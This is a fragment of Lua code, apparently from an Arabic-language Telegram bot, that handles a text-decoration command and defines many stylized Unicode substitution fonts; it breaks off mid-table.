        if text:match("^(زخرفه) (.*)$") then
		MatchesEN = {text:match("^(زخرفه) (.*)$")}; 
		TextToBeauty = MatchesEN[2] 
if #TextToBeauty > 20 then
			faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا يمكنني زخرفه كلمه تحتوي اكثر من 20 حرف •", 1, 'md')
			return
		end
		local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"
	local font_hash = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"
	local fonts = {
		"ⓐ,ⓑ,ⓒ,ⓓ,ⓔ,ⓕ,ⓖ,ⓗ,ⓘ,ⓙ,ⓚ,ⓛ,ⓜ,ⓝ,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,ⓣ,ⓤ,ⓥ,ⓦ,ⓧ,ⓨ,ⓩ,ⓐ,ⓑ,ⓒ,ⓓ,ⓔ,ⓕ,ⓖ,ⓗ,ⓘ,ⓙ,ⓚ,ⓛ,ⓜ,ⓝ,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,ⓣ,ⓤ,ⓥ,ⓦ,ⓧ,ⓨ,ⓩ,⓪,➈,➇,➆,➅,➄,➃,➂,➁,➀,●,_",
		"⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⓪,⑼,⑻,⑺,⑹,⑸,⑷,⑶,⑵,⑴,.,_",
		"α,в,c,∂,є,ƒ,g,н,ι,נ,к,ℓ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,χ,у,z,α,в,c,∂,є,ƒ,g,н,ι,נ,к,ℓ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,χ,у,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,в,c,d,e,ғ,ɢ,н,ι,j,ĸ,l,м,ɴ,o,p,q,r,ѕ,т,υ,v,w,х,y,z,α,в,c,d,e,ғ,ɢ,н,ι,j,ĸ,l,м,ɴ,o,p,q,r,ѕ,т,υ,v,w,х,y,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ą,ҍ,ç,ժ,ҽ,ƒ,ց,հ,ì,ʝ,ҟ,Ӏ,ʍ,ղ,օ,ք,զ,ɾ,ʂ,է,մ,ѵ,ա,×,վ,Հ,ą,ҍ,ç,ժ,ҽ,ƒ,ց,հ,ì,ʝ,ҟ,Ӏ,ʍ,ղ,օ,ք,զ,ɾ,ʂ,է,մ,ѵ,ա,×,վ,Հ,⊘,९,??,7,Ϭ,Ƽ,५,Ӡ,ϩ,𝟙,.,_",		"ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,ß,ς,d,ε,ƒ,g,h,ï,յ,κ,ﾚ,m,η,⊕,p,Ω,r,š,†,u,∀,ω,x,ψ,z,α,ß,ς,d,ε,ƒ,g,h,ï,յ,κ,ﾚ,m,η,⊕,p,Ω,r,š,†,u,∀,ω,x,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ﾑ,乃,ζ,Ð,乇,ｷ,Ǥ,ん,ﾉ,ﾌ,ズ,ﾚ,ᄊ,刀,Ծ,ｱ,Q,尺,ㄎ,ｲ,Ц,Џ,Щ,ﾒ,ﾘ,乙,ﾑ,乃,ζ,Ð,乇,ｷ,Ǥ,ん,ﾉ,ﾌ,ズ,ﾚ,ᄊ,刀,Ծ,ｱ,q,尺,ㄎ,ｲ,Ц,Џ,Щ,ﾒ,ﾘ,乙,ᅙ,9,8,ᆨ,6,5,4,3,ᆯ,1,.,_",
		"α,β,c,δ,ε,Ŧ,ĝ,h,ι,j,κ,l,ʍ,π,ø,ρ,φ,Ʀ,$,†,u,υ,ω,χ,ψ,z,α,β,c,δ,ε,Ŧ,ĝ,h,ι,j,κ,l,ʍ,π,ø,ρ,φ,Ʀ,$,†,u,υ,ω,χ,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ձ,ъ,ƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,ձ,ъ,ƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,ɓ,¢,Ɗ,£,ƒ,ɢ,ɦ,ĩ,ʝ,Қ,Ł,ɱ,ה,ø,Ṗ,Ҩ,Ŕ,Ş,Ŧ,Ū,Ɣ,ω,Ж,¥,Ẑ,Λ,ɓ,¢,Ɗ,£,ƒ,ɢ,ɦ,ĩ,ʝ,Қ,Ł,ɱ,ה,ø,Ṗ,Ҩ,Ŕ,Ş,Ŧ,Ū,Ɣ,ω,Ж,¥,Ẑ,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,Б,Ͼ,Ð,Ξ,Ŧ,G,H,ł,J,К,Ł,M,Л,Ф,P,Ǫ,Я,S,T,U,V,Ш,Ж,Џ,Z,Λ,Б,Ͼ,Ð,Ξ,Ŧ,g,h,ł,j,К,Ł,m,Л,Ф,p,Ǫ,Я,s,t,u,v,Ш,Ж,Џ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"A̴,̴B̴,̴C̴,̴D̴,̴E̴,̴F̴,̴G̴,̴H̴,̴I̴,̴J̴,̴K̴,̴L̴,̴M̴,̴N̴,̴O̴,̴P̴,̴Q̴,̴R̴,̴S̴,̴T̴,̴U̴,̴V̴,̴W̴,̴X̴,̴Y̴,̴Z̴,̴a̴,̴b̴,̴c̴,̴d̴,̴e̴,̴f̴,̴g̴,̴h̴,̴i̴,̴j̴,̴k̴,̴l̴,̴m̴,̴n̴,̴o̴,̴p̴,̴q̴,̴r̴,̴s̴,̴t̴,̴u̴,̴v̴,̴w̴,̴x̴,̴y̴,̴z̴,̴0̴,̴9̴,̴8̴,̴7̴,̴6̴,̴5̴,̴4̴,̴3̴,̴2̴,̴1̴,̴.̴,̴_̴",
		"ⓐ,ⓑ,ⓒ,ⓓ,ⓔ,ⓕ,ⓖ,ⓗ,ⓘ,ⓙ,ⓚ,ⓛ,ⓜ,ⓝ,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,ⓣ,ⓤ,ⓥ,ⓦ,ⓧ,ⓨ,ⓩ,ⓐ,ⓑ,ⓒ,ⓓ,ⓔ,ⓕ,ⓖ,ⓗ,ⓘ,ⓙ,ⓚ,ⓛ,ⓜ,ⓝ,ⓞ,ⓟ,ⓠ,ⓡ,ⓢ,ⓣ,ⓤ,ⓥ,ⓦ,ⓧ,ⓨ,ⓩ,⓪,➈,➇,➆,➅,➄,➃,➂,➁,➀,●,_",
		"⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⒜,⒝,⒞,⒟,⒠,⒡,⒢,⒣,⒤,⒥,⒦,⒧,⒨,⒩,⒪,⒫,⒬,⒭,⒮,⒯,⒰,⒱,⒲,⒳,⒴,⒵,⓪,⑼,⑻,⑺,⑹,⑸,⑷,⑶,⑵,⑴,.,_",
		"α,в,c,∂,є,ƒ,g,н,ι,נ,к,ℓ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,χ,у,z,α,в,c,∂,є,ƒ,g,н,ι,נ,к,ℓ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,χ,у,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,в,c,ɗ,є,f,g,н,ι,נ,к,Ɩ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,x,у,z,α,в,c,ɗ,є,f,g,н,ι,נ,к,Ɩ,м,η,σ,ρ,q,я,ѕ,т,υ,ν,ω,x,у,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,в,c,d,e,ғ,ɢ,н,ι,j,ĸ,l,м,ɴ,o,p,q,r,ѕ,т,υ,v,w,х,y,z,α,в,c,d,e,ғ,ɢ,н,ι,j,ĸ,l,м,ɴ,o,p,q,r,ѕ,т,υ,v,w,х,y,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,Ⴆ,ƈ,ԃ,ҽ,ϝ,ɠ,ԋ,ι,ʝ,ƙ,ʅ,ɱ,ɳ,σ,ρ,ϙ,ɾ,ʂ,ƚ,υ,ʋ,ɯ,x,ყ,ȥ,α,Ⴆ,ƈ,ԃ,ҽ,ϝ,ɠ,ԋ,ι,ʝ,ƙ,ʅ,ɱ,ɳ,σ,ρ,ϙ,ɾ,ʂ,ƚ,υ,ʋ,ɯ,x,ყ,ȥ,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,α,в,¢,đ,e,f,g,ħ,ı,נ,κ,ł,м,и,ø,ρ,q,я,š,т,υ,ν,ω,χ,ч,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ą,ɓ,ƈ,đ,ε,∱,ɠ,ɧ,ï,ʆ,ҡ,ℓ,ɱ,ŋ,σ,þ,ҩ,ŗ,ş,ŧ,ų,√,щ,х,γ,ẕ,ą,ɓ,ƈ,đ,ε,∱,ɠ,ɧ,ï,ʆ,ҡ,ℓ,ɱ,ŋ,σ,þ,ҩ,ŗ,ş,ŧ,ų,√,щ,х,γ,ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
		"ą,ҍ,ç,ժ,ҽ,ƒ,ց,հ,ì,ʝ,ҟ,Ӏ,ʍ,ղ,օ,ք,զ,ɾ,ʂ,է,մ,ѵ,ա,×,վ,Հ,ą,ҍ,ç,ժ,ҽ,ƒ,ց,հ,ì,ʝ,ҟ,Ӏ,ʍ,ղ,օ,ք,զ,ɾ,ʂ,է,մ,ѵ,ա,×,վ,Հ,⊘,९,𝟠,7,Ϭ,Ƽ,५,Ӡ,ϩ,𝟙,.,_",
		"მ,ჩ,ƈ,ძ,ε,բ,ց,հ,ἶ,ʝ,ƙ,l,ო,ղ,օ,ր,գ,ɾ,ʂ,է,մ,ν,ω,ჯ,ყ,z,მ,ჩ,ƈ,ძ,ε,բ,ց,հ,ἶ,ʝ,ƙ,l,ო,ղ,օ,ր,գ,ɾ,ʂ,է,մ,ν,ω,ჯ,ყ,z,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",
		"ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,ค,ც,८,ძ,૯,Բ,૭,Һ,ɿ,ʆ,қ,Ն,ɱ,Ո,૦,ƿ,ҩ,Ր,ς,੮,υ,౮,ω,૪,ע,ઽ,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,ß,ς,d,ε,ƒ,g,h,ï,յ,κ,ﾚ,m,η,⊕,p,Ω,r,š,†,u,∀,ω,x,ψ,z,α,ß,ς,d,ε,ƒ,g,h,ï,յ,κ,ﾚ,m,η,⊕,p,Ω,r,š,†,u,∀,ω,x,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ª,b,¢,Þ,È,F,૬,ɧ,Î,j,Κ,Ļ,м,η,◊,Ƿ,ƍ,r,S,⊥,µ,√,w,×,ý,z,ª,b,¢,Þ,È,F,૬,ɧ,Î,j,Κ,Ļ,м,η,◊,Ƿ,ƍ,r,S,⊥,µ,√,w,×,ý,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"Δ,Ɓ,C,D,Σ,F,G,H,I,J,Ƙ,L,Μ,∏,Θ,Ƥ,Ⴓ,Γ,Ѕ,Ƭ,Ʊ,Ʋ,Ш,Ж,Ψ,Z,λ,ϐ,ς,d,ε,ғ,ɢ,н,ι,ϳ,κ,l,ϻ,π,σ,ρ,φ,г,s,τ,υ,v,ш,ϰ,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,ค,๒,ς,๔,є,Ŧ,ɠ,ђ,เ,ן,к,l,๓,ภ,๏,թ,ợ,г,ร,t,ย,v,ฬ,x,ץ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,♡,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,♡,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ﾑ,乃,ζ,Ð,乇,ｷ,Ǥ,ん,ﾉ,ﾌ,ズ,ﾚ,ᄊ,刀,Ծ,ｱ,Q,尺,ㄎ,ｲ,Ц,Џ,Щ,ﾒ,ﾘ,乙,ﾑ,乃,ζ,Ð,乇,ｷ,Ǥ,ん,ﾉ,ﾌ,ズ,ﾚ,ᄊ,刀,Ծ,ｱ,q,尺,ㄎ,ｲ,Ц,Џ,Щ,ﾒ,ﾘ,乙,ᅙ,9,8,ᆨ,6,5,4,3,ᆯ,1,.,_",
		"α,β,c,δ,ε,Ŧ,ĝ,h,ι,j,κ,l,ʍ,π,ø,ρ,φ,Ʀ,$,†,u,υ,ω,χ,ψ,z,α,β,c,δ,ε,Ŧ,ĝ,h,ι,j,κ,l,ʍ,π,ø,ρ,φ,Ʀ,$,†,u,υ,ω,χ,ψ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ค,๖,¢,໓,ē,f,ງ,h,i,ว,k,l,๓,ຖ,໐,p,๑,r,Ş,t,น,ง,ຟ,x,ฯ,ຊ,ค,๖,¢,໓,ē,f,ງ,h,i,ว,k,l,๓,ຖ,໐,p,๑,r,Ş,t,น,ง,ຟ,x,ฯ,ຊ,0,9,8,7,6,5,4,3,2,1,.,_",
		"ձ,ъ,ƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,ձ,ъ,ƈ,ժ,ε,բ,ց,հ,ﻨ,յ,ĸ,l,ო,ռ,օ,թ,զ,г,ร,է,ս,ν,ա,×,ყ,২,0,9,8,7,6,5,4,3,2,1,.,_",
		"Â,ß,Ĉ,Ð,Є,Ŧ,Ǥ,Ħ,Ī,ʖ,Қ,Ŀ,♏,И,Ø,P,Ҩ,R,$,ƚ,Ц,V,Щ,X,￥,Ẕ,Â,ß,Ĉ,Ð,Є,Ŧ,Ǥ,Ħ,Ī,ʖ,Қ,Ŀ,♏,И,Ø,P,Ҩ,R,$,ƚ,Ц,V,Щ,X,￥,Ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,ɓ,¢,Ɗ,£,ƒ,ɢ,ɦ,ĩ,ʝ,Қ,Ł,ɱ,ה,ø,Ṗ,Ҩ,Ŕ,Ş,Ŧ,Ū,Ɣ,ω,Ж,¥,Ẑ,Λ,ɓ,¢,Ɗ,£,ƒ,ɢ,ɦ,ĩ,ʝ,Қ,Ł,ɱ,ה,ø,Ṗ,Ҩ,Ŕ,Ş,Ŧ,Ū,Ɣ,ω,Ж,¥,Ẑ,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,Б,Ͼ,Ð,Ξ,Ŧ,G,H,ł,J,К,Ł,M,Л,Ф,P,Ǫ,Я,S,T,U,V,Ш,Ж,Џ,Z,Λ,Б,Ͼ,Ð,Ξ,Ŧ,g,h,ł,j,К,Ł,m,Л,Ф,p,Ǫ,Я,s,t,u,v,Ш,Ж,Џ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"Թ,Յ,Շ,Ժ,ȝ,Բ,Գ,ɧ,ɿ,ʝ,ƙ,ʅ,ʍ,Ռ,Ծ,ρ,φ,Ր,Տ,Ե,Մ,ע,ա,Ճ,Վ,Հ,Թ,Յ,Շ,Ժ,ȝ,Բ,Գ,ɧ,ɿ,ʝ,ƙ,ʅ,ʍ,Ռ,Ծ,ρ,φ,Ր,Տ,Ե,Մ,ע,ա,Ճ,Վ,Հ,0,9,8,7,6,5,4,3,2,1,.,_",
		"Æ,þ,©,Ð,E,F,ζ,Ħ,Ї,¿,ズ,ᄂ,M,Ñ,Θ,Ƿ,Ø,Ґ,Š,τ,υ,¥,w,χ,y,շ,Æ,þ,©,Ð,E,F,ζ,Ħ,Ї,¿,ズ,ᄂ,M,Ñ,Θ,Ƿ,Ø,Ґ,Š,τ,υ,¥,w,χ,y,շ,0,9,8,7,6,5,4,3,2,1,.,_",
		"ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,ɐ,q,ɔ,p,ǝ,ɟ,ɓ,ɥ,ı,ſ,ʞ,ๅ,ɯ,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,ɒ,d,ɔ,b,ɘ,ʇ,ϱ,н,i,į,ʞ,l,м,и,o,q,p,я,ƨ,т,υ,v,w,x,γ,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"4,8,C,D,3,F,9,H,!,J,K,1,M,N,0,P,Q,R,5,7,U,V,W,X,Y,2,4,8,C,D,3,F,9,H,!,J,K,1,M,N,0,P,Q,R,5,7,U,V,W,X,Y,2,0,9,8,7,6,5,4,3,2,1,.,_",
		"Λ,M,X,ʎ,Z,ɐ,q,ɔ,p,ǝ,ɟ,ƃ,ɥ,ı,ɾ,ʞ,l,ա,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,Λ,M,X,ʎ,Z,ɐ,q,ɔ,p,ǝ,ɟ,ƃ,ɥ,ı,ɾ,ʞ,l,ա,u,o,d,b,ɹ,s,ʇ,n,ʌ,ʍ,x,ʎ,z,0,9,8,7,6,5,4,3,2,1,.,‾",
		"A̴,̴B̴,̴C̴,̴D̴,̴E̴,̴F̴,̴G̴,̴H̴,̴I̴,̴J̴,̴K̴,̴L̴,̴M̴,̴N̴,̴O̴,̴P̴,̴Q̴,̴R̴,̴S̴,̴T̴,̴U̴,̴V̴,̴W̴,̴X̴,̴Y̴,̴Z̴,̴a̴,̴b̴,̴c̴,̴d̴,̴e̴,̴f̴,̴g̴,̴h̴,̴i̴,̴j̴,̴k̴,̴l̴,̴m̴,̴n̴,̴o̴,̴p̴,̴q̴,̴r̴,̴s̴,̴t̴,̴u̴,̴v̴,̴w̴,̴x̴,̴y̴,̴z̴,̴0̴,̴9̴,̴8̴,̴7̴,̴6̴,̴5̴,̴4̴,̴3̴,̴2̴,̴1̴,̴.̴,̴_̴",
		"A̱,̱Ḇ,̱C̱,̱Ḏ,̱E̱,̱F̱,̱G̱,̱H̱,̱I̱,̱J̱,̱Ḵ,̱Ḻ,̱M̱,̱Ṉ,̱O̱,̱P̱,̱Q̱,̱Ṟ,̱S̱,̱Ṯ,̱U̱,̱V̱,̱W̱,̱X̱,̱Y̱,̱Ẕ,̱a̱,̱ḇ,̱c̱,̱ḏ,̱e̱,̱f̱,̱g̱,̱ẖ,̱i̱,̱j̱,̱ḵ,̱ḻ,̱m̱,̱ṉ,̱o̱,̱p̱,̱q̱,̱ṟ,̱s̱,̱ṯ,̱u̱,̱v̱,̱w̱,̱x̱,̱y̱,̱ẕ,̱0̱,̱9̱,̱8̱,̱7̱,̱6̱,̱5̱,̱4̱,̱3̱,̱2̱,̱1̱,̱.̱,̱_̱",
		"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",
		"Ā,̄B̄,̄C̄,̄D̄,̄Ē,̄F̄,̄Ḡ,̄H̄,̄Ī,̄J̄,̄K̄,̄L̄,̄M̄,̄N̄,̄Ō,̄P̄,̄Q̄,̄R̄,̄S̄,̄T̄,̄Ū,̄V̄,̄W̄,̄X̄,̄Ȳ,̄Z̄,̄ā,̄b̄,̄c̄,̄d̄,̄ē,̄f̄,̄ḡ,̄h̄,̄ī,̄j̄,̄k̄,̄l̄,̄m̄,̄n̄,̄ō,̄p̄,̄q̄,̄r̄,̄s̄,̄t̄,̄ū,̄v̄,̄w̄,̄x̄,̄ȳ,̄z̄,̄0̄,̄9̄,̄8̄,̄7̄,̄6̄,̄5̄,̄4̄,̄3̄,̄2̄,̄1̄,̄.̄,̄_̄",
		"A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",
		"a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_",
		"@,♭,ḉ,ⓓ,℮,ƒ,ℊ,ⓗ,ⓘ,נ,ⓚ,ℓ,ⓜ,η,ø,℘,ⓠ,ⓡ,﹩,т,ⓤ,√,ω,ж,૪,ℨ,@,♭,ḉ,ⓓ,℮,ƒ,ℊ,ⓗ,ⓘ,נ,ⓚ,ℓ,ⓜ,η,ø,℘,ⓠ,ⓡ,﹩,т,ⓤ,√,ω,ж,૪,ℨ,0,➈,➑,➐,➅,➄,➃,➌,➁,➊,.,_",
		"@,♭,¢,ⅾ,ε,ƒ,ℊ,ℌ,ї,נ,к,ℓ,м,п,ø,ρ,ⓠ,ґ,﹩,⊥,ü,√,ω,ϰ,૪,ℨ,@,♭,¢,ⅾ,ε,ƒ,ℊ,ℌ,ї,נ,к,ℓ,м,п,ø,ρ,ⓠ,ґ,﹩,⊥,ü,√,ω,ϰ,૪,ℨ,0,9,8,7,6,5,4,3,2,1,.,_",
		"α,♭,ḉ,∂,ℯ,ƒ,ℊ,ℌ,ї,ʝ,ḱ,ℓ,м,η,ø,℘,ⓠ,я,﹩,⊥,ц,ṽ,ω,ჯ,૪,ẕ,α,♭,ḉ,∂,ℯ,ƒ,ℊ,ℌ,ї,ʝ,ḱ,ℓ,м,η,ø,℘,ⓠ,я,﹩,⊥,ц,ṽ,ω,ჯ,૪,ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
		"@,ß,¢,ḓ,℮,ƒ,ℊ,ℌ,ї,נ,ḱ,ʟ,м,п,◎,℘,ⓠ,я,﹩,т,ʊ,♥️,ẘ,✄,૪,ℨ,@,ß,¢,ḓ,℮,ƒ,ℊ,ℌ,ї,נ,ḱ,ʟ,м,п,◎,℘,ⓠ,я,﹩,т,ʊ,♥️,ẘ,✄,૪,ℨ,0,9,8,7,6,5,4,3,2,1,.,_",
        "@,ß,¢,ḓ,℮,ƒ,ℊ,н,ḯ,נ,к,ℓμ,п,☺️,℘,ⓠ,я,﹩,⊥,υ,ṽ,ω,✄,૪,ℨ,@,ß,¢,ḓ,℮,ƒ,ℊ,н,ḯ,נ,к,ℓμ,п,☺️,℘,ⓠ,я,﹩,⊥,υ,ṽ,ω,✄,૪,ℨ,0,9,8,7,6,5,4,3,2,1,.,_",
        "@,ß,ḉ,ḓ,є,ƒ,ℊ,ℌ,ї,נ,ḱ,ʟ,ღ,η,◎,℘,ⓠ,я,﹩,⊥,ʊ,♥️,ω,ϰ,૪,ẕ,@,ß,ḉ,ḓ,є,ƒ,ℊ,ℌ,ї,נ,ḱ,ʟ,ღ,η,◎,℘,ⓠ,я,﹩,⊥,ʊ,♥️,ω,ϰ,૪,ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
        "@,ß,ḉ,∂,ε,ƒ,ℊ,ℌ,ї,נ,ḱ,ł,ღ,и,ø,℘,ⓠ,я,﹩,т,υ,√,ω,ჯ,૪,ẕ,@,ß,ḉ,∂,ε,ƒ,ℊ,ℌ,ї,נ,ḱ,ł,ღ,и,ø,℘,ⓠ,я,﹩,т,υ,√,ω,ჯ,૪,ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
        "α,♭,¢,∂,ε,ƒ,❡,н,ḯ,ʝ,ḱ,ʟ,μ,п,ø,ρ,ⓠ,ґ,﹩,т,υ,ṽ,ω,ж,૪,ẕ,α,♭,¢,∂,ε,ƒ,❡,н,ḯ,ʝ,ḱ,ʟ,μ,п,ø,ρ,ⓠ,ґ,﹩,т,υ,ṽ,ω,ж,૪,ẕ,0,9,8,7,6,5,4,3,2,1,.,_",
        "α,♭,ḉ,∂,℮,ⓕ,ⓖ,н,ḯ,ʝ,ḱ,ℓ,м,п,ø,ⓟ,ⓠ,я,ⓢ,ⓣ,ⓤ,♥️,ⓦ,✄,ⓨ,ⓩ,α,♭,ḉ,∂,℮,ⓕ,ⓖ,н,ḯ,ʝ,ḱ,ℓ,м,п,ø,ⓟ,ⓠ,я,ⓢ,ⓣ,ⓤ,♥️,ⓦ,✄,ⓨ,ⓩ,0,➒,➑,➐,➏,➄,➍,➂,➁,➀,.,_",
        "@,♭,ḉ,ḓ,є,ƒ,ⓖ,ℌ,ⓘ,נ,к,ⓛ,м,ⓝ,ø,℘,ⓠ,я,﹩,ⓣ,ʊ,√,ω,ჯ,૪,ⓩ,@,♭,ḉ,ḓ,є,ƒ,ⓖ,ℌ,ⓘ,נ,к,ⓛ,м,ⓝ,ø,℘,ⓠ,я,﹩,ⓣ,ʊ,√,ω,ჯ,૪,ⓩ,0,➒,➇,➆,➅,➄,➍,➌,➋,➀,.,_",
